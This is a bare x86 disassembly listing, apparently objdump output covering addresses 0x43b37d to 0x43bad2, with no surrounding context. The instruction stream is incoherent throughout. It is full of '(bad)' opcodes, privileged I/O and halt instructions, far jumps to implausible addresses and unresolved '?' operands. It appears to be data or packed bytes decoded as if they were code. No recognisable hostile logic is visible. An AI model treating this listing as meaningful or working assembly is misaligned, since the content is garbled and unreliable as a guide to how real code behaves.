  43b37d:	pushf  
  43b37e:	sub    eax,0xf5dd0cb9
  43b383:	and    ch,BYTE PTR [eax+0x6753bedc]
  43b389:	pop    ebx
  43b38a:	pop    es
  43b38b:	inc    ebx
  43b38c:	mov    ds:0x189ce881,eax
  43b391:	sub    esi,DWORD PTR [ebp-0x68cf99e2]
  43b397:	pop    ds
  43b398:	aaa    
  43b399:	xor    eax,0x24eb31d0
  43b39e:	cmp    edx,DWORD PTR [ebx+0x24f107f4]
  43b3a4:	icebp  
  43b3a5:	add    edi,0x1d
  43b3a8:	arpl   sp,ax
  43b3aa:	hlt    
  43b3ab:	test   BYTE PTR [ebp-0x670c0e62],bh
  43b3b1:	test   cl,0xf8
  43b3b4:	shl    DWORD PTR [ecx+0x0],cl
  43b3b7:	mov    dh,0xb1
  43b3b9:	ficom  DWORD PTR [edx]
  43b3bb:	and    ah,BYTE PTR [esi+0x79106a9e]
  43b3c1:	jbe    0x43b344
  43b3c3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  43b3c5:	add    DWORD PTR [ebp-0x6b8f0a5b],edx
  43b3cb:	push   ebx
  43b3cc:	std    
  43b3cd:	lea    esp,[ebp-0x4ff88f16]
  43b3d3:	cmp    BYTE PTR [ebp+0x4102d89a],cl
  43b3d9:	add    al,BYTE PTR [edx+0x6a444fd3]
  43b3df:	fild   QWORD PTR [esi+0x59]
  43b3e2:	ins    DWORD PTR es:[edi],dx
  43b3e3:	mov    ch,0x7
  43b3e5:	pushf  
  43b3e6:	pop    eax
  43b3e7:	outs   dx,DWORD PTR ds:[esi]
  43b3e8:	ret    
  43b3e9:	jae    0x43b429
  43b3eb:	leave  
  43b3ec:	add    eax,0x64129094
  43b3f1:	cmp    cl,BYTE PTR [esi]
  43b3f3:	jne    0x43b3e5
  43b3f5:	jns    0x43b411
  43b3f7:	or     ebx,ebx
  43b3f9:	retf   0x1b1b
  43b3fc:	jne    0x43b476
  43b3fe:	enter  0x5931,0x46
  43b402:	adc    BYTE PTR [esi-0x62],dl
  43b405:	inc    ebx
  43b406:	cld    
  43b407:	in     al,0x9b
  43b409:	mov    edx,0x38b5101d
  43b40e:	xor    al,0x3f
  43b410:	sar    BYTE PTR ds:0x22643d86,cl
  43b416:	inc    esp
  43b417:	dec    edx
  43b418:	gs ret 0x16d3
  43b41c:	(bad)
  43b41f:	pop    ss
  43b420:	and    eax,ecx
  43b422:	dec    esp
  43b423:	pop    ecx
  43b424:	mov    esp,DWORD PTR [edx]
  43b426:	cmovs  ecx,DWORD PTR [ebp+ebp*4+0xb9904af]
  43b42e:	and    eax,0x70b83a62
  43b433:	sub    cl,0xd8
  43b436:	pop    es
  43b437:	jo     0x43b42b
  43b439:	cmp    eax,0x604e9d8d
  43b43e:	aas    
  43b43f:	movnti DWORD PTR [edx+ecx*4],esp
  43b443:	mov    cl,0x88
  43b445:	xlat   BYTE PTR ds:[ebx]
  43b446:	es jne 0x43b400
  43b449:	cmc    
  43b44a:	push   0xffffffa9
  43b44c:	cmc    
  43b44d:	aam    0xf1
  43b44f:	les    edi,FWORD PTR [esi+eax*4+0x60a14dc8]
  43b456:	scas   eax,DWORD PTR es:[edi]
  43b457:	loope  0x43b4ae
  43b459:	shr    BYTE PTR [esi+0x51],cl
  43b45c:	mov    ecx,0xdb5756c4
  43b461:	out    0xbf,al
  43b463:	inc    ebx
  43b464:	pop    ss
  43b465:	outs   dx,DWORD PTR ds:[esi]
  43b466:	xchg   ebp,eax
  43b467:	mov    edi,0x44ffc82
  43b46c:	pop    esi
  43b46d:	(bad)  
  43b46e:	cmp    eax,0x80235cf
  43b473:	push   cs
  43b474:	pop    esp
  43b475:	mov    bl,BYTE PTR [edi-0x38e329aa]
  43b47b:	push   ss
  43b47c:	dec    esi
  43b47d:	and    esp,ebp
  43b47f:	xchg   edi,esi
  43b481:	push   0x37
  43b483:	ins    DWORD PTR es:[edi],dx
  43b484:	and    ch,BYTE PTR [eax]
  43b486:	push   eax
  43b487:	pop    ebp
  43b488:	pop    esi
  43b489:	icebp  
  43b48a:	lods   al,BYTE PTR ds:[esi]
  43b48b:	pminub mm7,mm7
  43b48e:	jle    0x43b4da
  43b490:	jae    0x43b49f
  43b492:	fisubr DWORD PTR [edx-0x41]
  43b495:	cli    
  43b496:	idiv   BYTE PTR [edx]
  43b498:	sub    bl,dh
  43b49a:	sub    eax,0x18e2ca55
  43b49f:	jne    0x43b4ab
  43b4a1:	pcmpeqd mm5,QWORD PTR [ebx]
  43b4a4:	inc    edi
  43b4a5:	jb     0x43b501
  43b4a7:	pop    edx
  43b4a8:	and    cl,BYTE PTR [esi-0x2a]
  43b4ab:	loopne 0x43b4a7
  43b4ad:	push   0xffffffab
  43b4af:	hlt    
  43b4b0:	push   ss
  43b4b1:	out    dx,eax
  43b4b2:	xchg   edi,eax
  43b4b3:	and    al,0x6d
  43b4b5:	push   cs
  43b4b6:	push   ds
  43b4b7:	scas   al,BYTE PTR es:[edi]
  43b4b8:	fneni(8087 only) 
  43b4ba:	(bad)  
  43b4bb:	mov    bh,0xaf
  43b4bd:	add    DWORD PTR [edx+edx*1-0x22b5daa],ebx
  43b4c4:	add    DWORD PTR [esp+ebp*2+0x79],0x4ccedf9c
  43b4cc:	test   al,0xfb
  43b4ce:	sbb    DWORD PTR [edi+eiz*8-0x5b],ebx
  43b4d2:	fs nop
  43b4d4:	inc    edi
  43b4d5:	pop    eax
  43b4d6:	lods   al,BYTE PTR ds:[esi]
  43b4d7:	jb     0x43b50a
  43b4d9:	mov    edx,0x76cad53c
  43b4de:	lods   al,BYTE PTR ds:[esi]
  43b4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b4e0:	adc    DWORD PTR [edi+0x76755e9a],ecx
  43b4e6:	cmp    BYTE PTR [ebx],bl
  43b4e8:	shl    cl,cl
  43b4ea:	cmp    DWORD PTR [edi],0x17aa13e2
  43b4f0:	(bad)  
  43b4f1:	sar    DWORD PTR [eax+0x32],cl
  43b4f4:	jmp    0x8435f3e
  43b4f9:	fisttp QWORD PTR [ecx-0x48]
  43b4fc:	iretw  
  43b4fe:	(bad)  [ebp+eax*2-0x4b9a988a]
  43b505:	xor    al,0x18
  43b507:	sbb    edi,DWORD PTR [edx-0x2f]
  43b50a:	retf   0xacfb
  43b50d:	cdq    
  43b50e:	inc    edi
  43b50f:	adc    al,0x91
  43b511:	fistp  WORD PTR [esi]
  43b513:	fnstsw WORD PTR [ebx]
  43b515:	jo     0x43b579
  43b517:	push   edx
  43b518:	xchg   edx,eax
  43b519:	sti    
  43b51a:	add    DWORD PTR [edx],esi
  43b51c:	bound  edx,QWORD PTR ds:[edi+0x5a3f2bea]
  43b523:	sbb    eax,0xb3e0594a
  43b528:	in     eax,dx
  43b529:	dec    ebx
  43b52a:	push   eax
  43b52b:	cld    
  43b52c:	fwait
  43b52d:	mov    esp,0x87b5ff17
  43b532:	(bad)  [edi]
  43b534:	xchg   DWORD PTR [edx+edi*2+0x24e9615b],esi
  43b53b:	sub    DWORD PTR [edx-0x3e],esi
  43b53e:	pop    edx
  43b53f:	xchg   edx,eax
  43b540:	mov    bl,0xe
  43b542:	or     al,0x98
  43b544:	mov    ds:0x5f65e712,eax
  43b549:	mov    ds:0x6ce7219,al
  43b54e:	aam    0x9b
  43b550:	lock push eax
  43b552:	bound  edi,QWORD PTR [edi-0x3795a960]
  43b558:	stos   BYTE PTR es:[edi],al
  43b559:	icebp  
  43b55a:	stos   BYTE PTR es:[edi],al
  43b55b:	jae    0x43b55f
  43b55d:	retf   0xda69
  43b560:	mov    eax,0xa172c5e9
  43b565:	(bad)  
  43b566:	ja     0x43b58d
  43b568:	mov    dl,0xb4
  43b56a:	imul   DWORD PTR [edx-0x45]
  43b56d:	std    
  43b56e:	(bad)  [ecx+0x1fbbe93f]
  43b574:	nop
  43b575:	jo     0x43b56a
  43b577:	push   ds
  43b578:	or     dh,bh
  43b57a:	jge    0x43b5ad
  43b57c:	les    edx,FWORD PTR [ecx+0x540f4bab]
  43b582:	std    
  43b583:	sbb    al,0xc2
  43b585:	fcomp  QWORD PTR [ecx+0x5f]
  43b588:	fiadd  WORD PTR [ecx]
  43b58a:	gs mov bh,0x57
  43b58d:	cmp    DWORD PTR gs:[esi+ebp*4+0x14],esi
  43b592:	inc    ebp
  43b593:	cmp    eax,0x535a458b
  43b598:	sbb    esi,esp
  43b59a:	jmp    0x9fb5b376
  43b59f:	inc    edi
  43b5a0:	dec    ebp
  43b5a1:	(bad)  
  43b5a2:	sub    al,0xb0
  43b5a4:	inc    esi
  43b5a5:	jno    0x43b5fc
  43b5a7:	jno    0x43b5aa
  43b5a9:	xchg   edx,eax
  43b5aa:	gs leave 
  43b5ac:	icebp  
  43b5ad:	out    dx,al
  43b5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b5af:	pusha  
  43b5b0:	das    
  43b5b1:	in     eax,0x32
  43b5b3:	fs push ebx
  43b5b5:	fs push edi
  43b5b7:	repz mov al,ds:0xda8c5320
  43b5bd:	pop    esi
  43b5be:	jne    0x43b580
  43b5c0:	dec    eax
  43b5c1:	mov    ebp,0x44a47dca
  43b5c6:	sub    BYTE PTR [eax-0x1e689e46],0x39
  43b5cd:	push   cs
  43b5ce:	mov    esi,0x2d426be6
  43b5d3:	cld    
  43b5d4:	push   ebp
  43b5d5:	in     eax,0x5e
  43b5d7:	push   eax
  43b5d8:	sbb    eax,0xb0266cc2
  43b5dd:	retf   
  43b5de:	sbb    BYTE PTR [ecx],0xf5
  43b5e1:	pop    es
  43b5e2:	sbb    DWORD PTR [edi],eax
  43b5e4:	daa    
  43b5e5:	jns    0x43b5cd
  43b5e7:	(bad)  
  43b5e8:	xchg   edx,eax
  43b5e9:	sbb    ebp,edx
  43b5eb:	dec    ebp
  43b5ec:	xchg   edi,eax
  43b5ed:	push   cs
  43b5ee:	sbb    al,0x8e
  43b5f0:	cmp    al,0xa6
  43b5f2:	dec    edx
  43b5f3:	imul   esi,DWORD PTR [eax+ebx*8+0x19],0xffffff83
  43b5f8:	cmc    
  43b5f9:	cld    
  43b5fa:	mov    ds:0x4b061ee9,eax
  43b5ff:	sub    eax,0xf94962d4
  43b604:	cmc    
  43b605:	call   0x58e83775
  43b60a:	sahf   
  43b60b:	sbb    BYTE PTR [eax+0x48],ch
  43b60e:	jp     0x43b64b
  43b610:	and    al,0xe3
  43b612:	cli    
  43b613:	scas   al,BYTE PTR es:[edi]
  43b614:	out    dx,al
  43b615:	icebp  
  43b616:	pop    esi
  43b617:	push   edi
  43b618:	or     ebp,DWORD PTR [esi]
  43b61a:	cmp    al,0x13
  43b61c:	dec    esi
  43b61d:	retf   0x38c9
  43b620:	(bad)  [edi+0x25f9e1e3]
  43b626:	ss push esp
  43b628:	stos   BYTE PTR es:[edi],al
  43b629:	mov    ebx,0x97e896e8
  43b62e:	and    BYTE PTR [ebp-0x75],al
  43b631:	sahf   
  43b632:	stc    
  43b633:	out    dx,eax
  43b634:	in     eax,dx
  43b635:	les    eax,FWORD PTR [edx]
  43b637:	scas   al,BYTE PTR es:[edi]
  43b638:	mov    ebx,DWORD PTR ds:0x72a95f53
  43b63e:	jg     0x43b6a3
  43b640:	push   ds
  43b641:	dec    esi
  43b642:	push   ecx
  43b643:	in     al,0xfa
  43b645:	adc    al,BYTE PTR [esi+0x27]
  43b648:	rcl    edx,cl
  43b64a:	test   al,0x39
  43b64c:	push   ebp
  43b64d:	ret    
  43b64e:	out    0x58,al
  43b650:	pop    ecx
  43b651:	leave  
  43b652:	fisub  WORD PTR [esi+0x1e]
  43b655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b656:	aam    0xa0
  43b658:	sbb    eax,0x5af7f410
  43b65d:	jmp    0xe1349d05
  43b662:	mov    ecx,0x48888ca0
  43b667:	repz cmp eax,0xca54c914
  43b66d:	add    BYTE PTR [edi-0x4bf13fde],0x5
  43b674:	pusha  
  43b675:	(bad)  [edi-0x582c2a11]
  43b67b:	pop    eax
  43b67c:	adc    eax,0x5b96c092
  43b681:	fsubr  QWORD PTR [ebx]
  43b683:	sub    DWORD PTR [eax-0x41],0xcd465aa6
  43b68a:	mov    edi,0xfb6ee21
  43b68f:	cmp    BYTE PTR [edx],bh
  43b691:	add    edx,esi
  43b693:	dec    esp
  43b694:	test   eax,0x1901dbfc
  43b699:	jno    0x43b69c
  43b69b:	hlt    
  43b69c:	push   0xffffffe8
  43b69e:	mov    dl,0x83
  43b6a0:	cld    
  43b6a1:	dec    ebx
  43b6a2:	mov    cl,0xe7
  43b6a4:	(bad)  
  43b6a5:	cmp    al,0x65
  43b6a7:	cmp    DWORD PTR [ecx+0x4],0x7c
  43b6ab:	push   0xf
  43b6ad:	clc    
  43b6ae:	push   ss
  43b6af:	mov    esi,0x37d5b45c
  43b6b4:	out    dx,eax
  43b6b5:	jmp    0xedf2a49d
  43b6ba:	inc    ecx
  43b6bb:	push   eax
  43b6bc:	shl    BYTE PTR [edi+0x53187b77],cl
  43b6c2:	call   0x2263bef
  43b6c7:	test   DWORD PTR [ecx-0x52850ecb],eax
  43b6cd:	push   DWORD PTR [eax+esi*4+0x79d11337]
  43b6d4:	fidivr DWORD PTR [edx]
  43b6d6:	lods   eax,DWORD PTR ds:[esi]
  43b6d7:	sar    DWORD PTR [esi],0x84
  43b6da:	add    eax,0x5e7810fa
  43b6df:	out    dx,al
  43b6e0:	ret    
  43b6e1:	fwait
  43b6e2:	xchg   esi,eax
  43b6e3:	fnstsw WORD PTR [edi]
  43b6e5:	cdq    
  43b6e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b6e7:	add    DWORD PTR [edi-0x538d52fc],0x42
  43b6ee:	mov    BYTE PTR [edi+0x18],0xaf
  43b6f2:	mov    dl,0xd4
  43b6f4:	loope  0x43b6d4
  43b6f6:	xor    al,0x27
  43b6f8:	push   ecx
  43b6f9:	xchg   ebx,eax
  43b6fa:	outs   dx,DWORD PTR ds:[esi]
  43b6fb:	sbb    al,0x6
  43b6fd:	repz and al,0x66
  43b700:	add    al,0x8
  43b702:	pop    ebp
  43b703:	loopne 0x43b739
  43b705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b706:	jg     0x43b6ad
  43b708:	pop    ds
  43b709:	lahf   
  43b70a:	test   eax,0xacacd49b
  43b70f:	mov    bl,0xe7
  43b711:	mov    bl,0x45
  43b713:	in     eax,dx
  43b714:	iret   
  43b715:	mov    eax,0x978d2c5
  43b71a:	cmp    ch,BYTE PTR [ebx]
  43b71c:	xchg   edx,eax
  43b71d:	add    BYTE PTR [ebx+0x69],0xce
  43b721:	dec    esp
  43b722:	push   eax
  43b723:	in     al,dx
  43b724:	pop    ecx
  43b725:	xchg   DWORD PTR [esi+0x7b],edx
  43b728:	bound  edx,QWORD PTR [esi*4+0x5cfefa1c]
  43b72f:	jmp    0xb047:0x7e57b21c
  43b736:	xchg   DWORD PTR [ebp-0x8],ebp
  43b739:	inc    ecx
  43b73a:	mov    dl,0x5c
  43b73c:	sub    bl,BYTE PTR [edi]
  43b73e:	jns    0x43b744
  43b740:	cmc    
  43b741:	in     al,0xde
  43b743:	leave  
  43b744:	pop    ebx
  43b745:	pop    ecx
  43b747:	jnp    0x43b78a
  43b749:	fsubr  DWORD PTR [edx]
  43b74b:	(bad)  
  43b74d:	int3   
  43b74e:	xor    edi,DWORD PTR [eax+0x2e]
  43b751:	std    
  43b752:	lods   eax,DWORD PTR ds:[esi]
  43b753:	pop    ecx
  43b754:	int    0xb
  43b756:	out    0x51,al
  43b758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b759:	fldcw  WORD PTR [edx+ecx*4-0x51]
  43b75d:	mov    eax,ds:0x1a62e05e
  43b762:	cwde   
  43b763:	mov    bl,0xc1
  43b765:	fistp  DWORD PTR [eax]
  43b767:	imul   ecx,DWORD PTR [edi-0x5015f74d],0xffffff95
  43b76e:	add    eax,0x7fd75724
  43b773:	shl    DWORD PTR [ebp-0x539d23a8],1
  43b779:	fnstenv es:[edx]
  43b77c:	ja     0x43b78a
  43b77e:	push   ds
  43b77f:	or     BYTE PTR [eiz*1+0x325c2b1a],0x9f
  43b787:	cmp    eax,0x2c31771
  43b78c:	daa    
  43b78d:	stos   BYTE PTR es:[edi],al
  43b78e:	jl     0x43b78e
  43b790:	cmp    al,0x13
  43b792:	test   al,0xdc
  43b794:	adc    esp,DWORD PTR [edi+0x1d]
  43b797:	leave  
  43b798:	popa   
  43b799:	imul   ebx,DWORD PTR [edi-0x13],0xffffff95
  43b79d:	add    DWORD PTR [edi],eax
  43b79f:	nop
  43b7a0:	in     eax,dx
  43b7a1:	cmp    DWORD PTR [ebx-0x48],esp
  43b7a4:	inc    eax
  43b7a5:	out    0x85,al
  43b7a7:	jae    0x43b787
  43b7a9:	out    dx,al
  43b7aa:	(bad)  
  43b7ab:	(bad)  [edx-0x2c2d1d31]
  43b7b1:	popf   
  43b7b2:	scas   al,BYTE PTR es:[edi]
  43b7b3:	aam    0x93
  43b7b5:	dec    esp
  43b7b6:	push   es
  43b7b7:	pop    es
  43b7b8:	mov    cl,0x22
  43b7ba:	sbb    eax,0x199f45e6
  43b7bf:	sar    BYTE PTR [edx+0x70],1
  43b7c2:	cld    
  43b7c3:	mov    esi,0x9fdb15b0
  43b7c8:	pop    esi
  43b7c9:	mov    dh,0xdc
  43b7cb:	inc    edi
  43b7cc:	mov    ebx,0x25d02689
  43b7d1:	inc    ebp
  43b7d2:	xor    al,0x94
  43b7d4:	in     al,dx
  43b7d5:	pop    es
  43b7d6:	or     eax,edx
  43b7d8:	inc    esi
  43b7da:	xor    bl,BYTE PTR [ecx-0x388627dc]
  43b7e0:	pop    ss
  43b7e1:	js     0x43b859
  43b7e3:	sbb    eax,0x9468b501
  43b7e8:	push   0xffffffcc
  43b7ea:	in     al,0x81
  43b7ec:	push   0xb55bb12d
  43b7f1:	pop    ss
  43b7f2:	xor    eax,0x214a292
  43b7f7:	adc    BYTE PTR [edi-0x2e],0xe
  43b7fb:	inc    edx
  43b7fc:	outs   dx,DWORD PTR ds:[esi]
  43b7fd:	aaa    
  43b7fe:	pushf  
  43b7ff:	arpl   WORD PTR [ebp+0x6a36a5b5],bp
  43b805:	and    al,0x75
  43b807:	adc    BYTE PTR [edi-0x71],dh
  43b80a:	fadd   DWORD PTR [ebp-0xc]
  43b80d:	xor    esi,DWORD PTR [eax-0x769c6ed8]
  43b813:	lds    esi,FWORD PTR [ebp+0x5d]
  43b816:	or     ah,BYTE PTR [ecx-0x615dd23c]
  43b81c:	jle    0x43b7cd
  43b81e:	in     al,dx
  43b81f:	repnz aad 0x6f
  43b822:	inc    esp
  43b823:	retf   
  43b824:	push   0x19
  43b826:	cmp    eax,0x3da84a4b
  43b82b:	daa    
  43b82c:	fwait
  43b82d:	daa    
  43b82e:	in     eax,dx
  43b82f:	retf   
  43b830:	mov    ds:0x7179671d,al
  43b835:	dec    eax
  43b836:	jecxz  0x43b882
  43b838:	jg     0x43b7d2
  43b83a:	mov    edx,0x97008bdc
  43b83f:	icebp  
  43b840:	std    
  43b841:	test   eax,0xe62c98b6
  43b846:	pop    ebx
  43b847:	pop    esi
  43b848:	sub    ebp,DWORD PTR [eax+0x5546b959]
  43b84e:	mov    eax,ds:0x9e5e541a
  43b853:	lods   al,BYTE PTR ds:[esi]
  43b854:	in     eax,0x89
  43b856:	push   0x8b2355ad
  43b85b:	cmp    ecx,DWORD PTR [edi+0x7ef7f6a2]
  43b861:	xchg   esi,eax
  43b862:	dec    eax
  43b863:	bound  ebp,QWORD PTR [ebx+esi*1-0x6bf15a10]
  43b86a:	scas   al,BYTE PTR es:[edi]
  43b86b:	pop    ds
  43b86c:	push   es
  43b86d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b86e:	and    bl,BYTE PTR [eax+esi*4-0x5c]
  43b872:	dec    ebx
  43b873:	(bad)  [edx]
  43b875:	mov    bh,BYTE PTR [ebx]
  43b877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b878:	push   ebp
  43b879:	adc    ebx,DWORD PTR [edx]
  43b87b:	adc    BYTE PTR [ecx+0x7a19a7d6],dl
  43b881:	xchg   DWORD PTR [eax],edx
  43b883:	sbb    eax,0x26fe2688
  43b888:	lods   eax,DWORD PTR ds:[esi]
  43b889:	ja     0x43b82c
  43b88b:	retf   0x4649
  43b88e:	enter  0x297,0xa5
  43b892:	ja     0x43b8f8
  43b894:	stos   WORD PTR es:[edi],ax
  43b896:	mov    eax,ds:0x3524c0f2
  43b89b:	add    eax,0xa83bae96
  43b8a0:	add    eax,DWORD PTR [ecx]
  43b8a2:	repnz cld 
  43b8a4:	jle    0x43b8d9
  43b8a6:	(bad)  
  43b8a7:	push   ecx
  43b8a9:	or     BYTE PTR [esi+0x26],0x28
  43b8ad:	or     esp,DWORD PTR [edx]
  43b8af:	mov    bl,0xb5
  43b8b1:	js     0x43b854
  43b8b3:	adc    eax,ebp
  43b8b5:	xchg   ecx,eax
  43b8b6:	cmp    ebx,edi
  43b8b8:	xor    al,0x14
  43b8ba:	cwde   
  43b8bb:	mov    esi,0xecdcf058
  43b8c0:	sub    al,0x13
  43b8c2:	cmp    edx,esi
  43b8c4:	jno    0x43b8f2
  43b8c6:	cmovo  eax,DWORD PTR [ebp-0x67]
  43b8ca:	add    BYTE PTR [ecx],dl
  43b8cc:	mov    ebp,0x948ddcca
  43b8d1:	and    BYTE PTR [ebx-0x2ed704fd],bh
  43b8d7:	inc    edi
  43b8d8:	mov    ds:0x22cfb639,al
  43b8dd:	sub    al,0x53
  43b8df:	mov    dl,0x8d
  43b8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b8e2:	ins    BYTE PTR es:[edi],dx
  43b8e3:	and    ah,al
  43b8e5:	dec    edx
  43b8e6:	icebp  
  43b8e7:	and    bh,BYTE PTR ds:0x2bd8274d
  43b8ed:	in     al,dx
  43b8ee:	cli    
  43b8ef:	fs sahf 
  43b8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b8f2:	sbb    DWORD PTR [esi],ebx
  43b8f4:	mov    dh,0xa4
  43b8f6:	inc    esi
  43b8f7:	cdq    
  43b8f8:	sub    eax,0x716c397c
  43b8fd:	add    ah,bl
  43b8ff:	inc    edi
  43b900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b901:	mov    ds:0x8769d4b4,al
  43b906:	aas    
  43b907:	cmp    eax,0x91f4215b
  43b90c:	mov    eax,0x1c4b41ee
  43b911:	push   es
  43b912:	ja     0x43b992
  43b914:	and    bh,cl
  43b916:	lock outs dx,BYTE PTR ss:[esi]
  43b919:	ins    BYTE PTR es:[edi],dx
  43b91a:	jnp    0x43b922
  43b91c:	mov    ah,0x44
  43b91e:	jmp    0x43b8ce
  43b920:	shr    ecx,cl
  43b922:	jno    0x43b97c
  43b924:	mov    WORD PTR [eax-0x34],fs
  43b927:	ds push esp
  43b929:	fabs   
  43b92b:	or     al,0x6
  43b92d:	(bad)  
  43b92e:	outs   dx,BYTE PTR ds:[esi]
  43b92f:	jb     0x43b97f
  43b931:	inc    esi
  43b932:	dec    ecx
  43b933:	aad    0xbe
  43b935:	jnp    0x43b994
  43b937:	push   eax
  43b938:	ins    DWORD PTR es:[edi],dx
  43b939:	jle    0x43b93e
  43b93b:	xchg   edx,eax
  43b93c:	sbb    eax,0xe3c72be5
  43b941:	add    DWORD PTR [edx],ebp
  43b943:	cwde   
  43b944:	jmp    0x43b8eb
  43b946:	sbb    esp,DWORD PTR [ecx+0x49]
  43b949:	sub    BYTE PTR [edi+0x483692e7],bl
  43b94f:	aaa    
  43b950:	cmp    BYTE PTR [esi+0x3],cl
  43b953:	data16 stos BYTE PTR es:[edi],al
  43b955:	pop    esi
  43b956:	push   ss
  43b957:	das    
  43b958:	xchg   al,ah
  43b95a:	mov    eax,0x463c6dcf
  43b95f:	push   ds
  43b960:	lock cld 
  43b962:	pop    eax
  43b963:	inc    BYTE PTR [edi]
  43b965:	mov    ebp,0x99397bac
  43b96a:	pop    esi
  43b96b:	and    eax,0x564f7dea
  43b970:	mov    esi,0xfbeffd56
  43b975:	lahf   
  43b976:	mov    ?,WORD PTR [ebp+0x37]
  43b979:	data16 or al,0x79
  43b97c:	sbb    ebp,DWORD PTR [ebx-0x354e62b9]
  43b982:	mov    cl,0xa2
  43b984:	sbb    BYTE PTR [ebx],dh
  43b986:	cmc    
  43b987:	pop    esi
  43b988:	ret    
  43b989:	or     eax,0x2b90b765
  43b98e:	daa    
  43b98f:	test   DWORD PTR [esi],ebp
  43b991:	retf   
  43b992:	adc    DWORD PTR [ecx+0x4ca7ea19],ebx
  43b998:	lods   eax,DWORD PTR ds:[esi]
  43b999:	popf   
  43b99a:	jge    0x43b9e7
  43b99c:	clc    
  43b99d:	leave  
  43b99e:	push   ebx
  43b99f:	sbb    eax,0xcaa1b2e1
  43b9a4:	mov    ah,0xba
  43b9a6:	pushf  
  43b9a7:	aaa    
  43b9a8:	sbb    BYTE PTR [edi+0x14],al
  43b9ab:	sbb    ecx,DWORD PTR [ecx]
  43b9ad:	mov    BYTE PTR [esi+0x40fd7295],ah
  43b9b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b9b4:	fisubr DWORD PTR ds:0xde1a3d84
  43b9ba:	imul   edi,DWORD PTR [edx+0x4],0xff99eed4
  43b9c1:	fld    st(7)
  43b9c3:	ss mov ah,0xc4
  43b9c6:	in     al,0x30
  43b9c8:	or     ecx,DWORD PTR [ebx+edx*1]
  43b9cb:	sub    BYTE PTR [eax+0x4b],cl
  43b9ce:	jo     0x43ba2c
  43b9d0:	sub    BYTE PTR [ebx+0x72],ah
  43b9d3:	pop    esp
  43b9d4:	xor    DWORD PTR [ebx+0xe],0xffffff84
  43b9d8:	sbb    edi,ebp
  43b9da:	ret    0x50f4
  43b9dd:	mov    ebx,0xa4787b5b
  43b9e2:	(bad)  
  43b9e3:	ds shl bh,cl
  43b9e6:	pusha  
  43b9e7:	les    edi,FWORD PTR [ecx]
  43b9e9:	icebp  
  43b9ea:	lock push ebp
  43b9ec:	dec    ebx
  43b9ed:	mov    edi,0x19f85341
  43b9f2:	out    0x51,eax
  43b9f4:	inc    esp
  43b9f5:	mov    bl,0x3a
  43b9f7:	mov    dh,0x6
  43b9f9:	and    esp,DWORD PTR [esi]
  43b9fb:	pop    ds
  43b9fc:	pop    ebx
  43b9fd:	jne    0x43b9e4
  43b9ff:	out    0x54,eax
  43ba01:	mov    es,ecx
  43ba03:	das    
  43ba04:	popf   
  43ba05:	call   0x3b7e:0xe4da1cde
  43ba0c:	sub    cl,BYTE PTR ds:0x6e01ef0a
  43ba12:	cli    
  43ba13:	adc    eax,0xb923f52f
  43ba18:	sbb    eax,DWORD PTR ds:0x9ea6e267
  43ba1e:	jo     0x43ba89
  43ba20:	sub    eax,DWORD PTR [ebx+0x7d]
  43ba23:	jbe    0x43ba93
  43ba25:	fdiv   QWORD PTR [edi+0xbd98d2a]
  43ba2b:	sbb    DWORD PTR [ecx],esp
  43ba2d:	pop    eax
  43ba2e:	jbe    0x43b9eb
  43ba30:	add    eax,0x90f7043e
  43ba35:	jecxz  0x43ba7e
  43ba37:	in     al,dx
  43ba38:	out    0x29,eax
  43ba3a:	mov    DWORD PTR [eax+0x50814604],edi
  43ba40:	and    eax,0x1fc643e5
  43ba45:	(bad)  
  43ba46:	push   ebx
  43ba47:	jno    0x43baa1
  43ba49:	cli    
  43ba4a:	jno    0x43ba09
  43ba4c:	xchg   ecx,esp
  43ba4e:	sub    edx,DWORD PTR [edx+ebx*8-0x4abd85a7]
  43ba55:	inc    ebp
  43ba56:	cmp    al,0x2a
  43ba58:	(bad)  
  43ba59:	in     al,dx
  43ba5a:	sub    ebx,DWORD PTR [esi+0x34]
  43ba5d:	out    dx,al
  43ba5e:	xor    DWORD PTR [edi-0x3d356e88],0x12241902
  43ba68:	(bad)  
  43ba69:	mov    ah,0xa1
  43ba6b:	repz xchg esp,eax
  43ba6d:	jle    0x43ba19
  43ba6f:	adc    ah,ah
  43ba71:	jo     0x43ba63
  43ba73:	jecxz  0x43ba6b
  43ba75:	scas   al,BYTE PTR es:[edi]
  43ba76:	out    0x82,eax
  43ba78:	sbb    BYTE PTR [edi-0x4ee2682d],ah
  43ba7e:	push   esp
  43ba7f:	fild   DWORD PTR [ebx+0x1554d22f]
  43ba85:	mov    dh,0xf3
  43ba87:	ins    DWORD PTR es:[edi],dx
  43ba88:	call   0x8cbe:0x7c14550a
  43ba8f:	idiv   DWORD PTR [ebx-0x3d]
  43ba92:	pop    ds
  43ba93:	or     eax,ebp
  43ba95:	mov    ah,dh
  43ba97:	pop    edi
  43ba98:	pop    ebx
  43ba99:	rcl    ebp,cl
  43ba9b:	inc    edx
  43ba9c:	mov    ah,0xdd
  43ba9e:	xor    ch,BYTE PTR fs:[ebx-0x8e97bf5]
  43baa5:	cwde   
  43baa6:	mov    edx,?
  43baa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43baa9:	mov    BYTE PTR [edi+0x760834db],dl
  43baaf:	in     eax,0x7c
  43bab1:	mov    al,ds:0x11d7f3e
  43bab6:	xchg   DWORD PTR [edx],ebx
  43bab8:	add    eax,0x25d38f55
  43babd:	xor    DWORD PTR [ebx+0x20b54611],esp
  43bac3:	dec    esp
  43bac4:	mov    ebp,0x11399643
  43bac9:	outs   dx,BYTE PTR ds:[esi]
  43baca:	es xchg esp,eax
  43bacc:	sbb    bh,BYTE PTR [ebp-0x55]
  43bacf:	je     0x43bb05
  43bad1:	push   ss
  43bad2:	inc    esi
